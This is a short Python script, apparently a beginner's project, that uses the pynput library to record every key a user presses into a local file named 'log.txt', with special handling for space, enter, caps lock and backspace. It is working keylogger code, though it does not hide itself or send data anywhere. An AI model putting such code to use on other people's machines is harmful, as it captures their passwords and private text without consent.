from pynput import keyboard

# Function that handles logging (parameter being the key the user pressed)
def logger(key):
    # logs the keys the user writes to 'log.txt', also has some specific cases for some keys, like space and backspace
    with open('log.txt', 'a') as output:
        match key:
            case keyboard.Key.caps_lock:
                output.write('[CAPS LOCK]')
            case keyboard.Key.enter:
                output.write('\n')
            case keyboard.Key.space:
                output.write(' ')
            case keyboard.Key.backspace:
                with open('log.txt', 'r+') as output:
                    # read the current content and remove the last character
                    content = output.read()
                    content = content[:-1]
                    
                    # move cursor to the beginning and rewrite updated content
                    output.seek(0)
                    output.write(content)
                    output.truncate()
            case _:
                try:
                    output.write(key.char)
                except AttributeError:
                    output.write(f' {key} ')

# similar to javascript's addEventlistener, I start an event here that listens to the keys the user presses
listener = keyboard.Listener(on_press=logger)
listener.start()
input()